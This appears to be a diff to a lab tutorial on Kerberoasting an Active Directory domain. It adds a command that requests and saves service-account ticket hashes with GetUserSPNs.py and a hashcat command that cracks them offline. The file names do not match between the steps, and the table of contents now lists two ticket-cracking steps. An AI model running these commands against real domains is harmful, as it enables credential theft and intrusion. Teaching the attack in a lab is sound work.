@@ -14,7 +14,7 @@
 - [Attack Process](#attack-process)
   - [Step 1 – Find Service Accounts](#step-1--find-service-accounts)
   - [Step 2 – Save Hash to File](#step-2--save-hash-to-file)
-  - [Step 3 – Extract the Ticket](#step-3--extract-the-ticket)
+  - [Step 3 – Crack the Ticket](#step-3--crack-the-ticket)
   - [Step 4 – Crack the Ticket Offline](#step-4--crack-the-ticket-offline)
   - [Step 5 – Use the Credentials](#step-5--use-the-credentials)
 - [Why Kerberoasting is Dangerous](#why-kerberoasting-is-dangerous)
@@ -108,6 +108,15 @@ $krb5tgs$23$*sqlservice$READTEAMBD.LOCAL$ReadTeamBD-DC/SQLService.READTEAMBD.loc
 
 ## Step 2 – Save hash to file
 
+- save hash to `kerberoast.txt` file
+
 ```bash
 GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request -outputfile kerberoast.txt
 ```
+
+## Step 3 - Crack the ticket
+
+```bash
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+`-m 13100 = Kerberos 5 TGS-REP (RC4)`
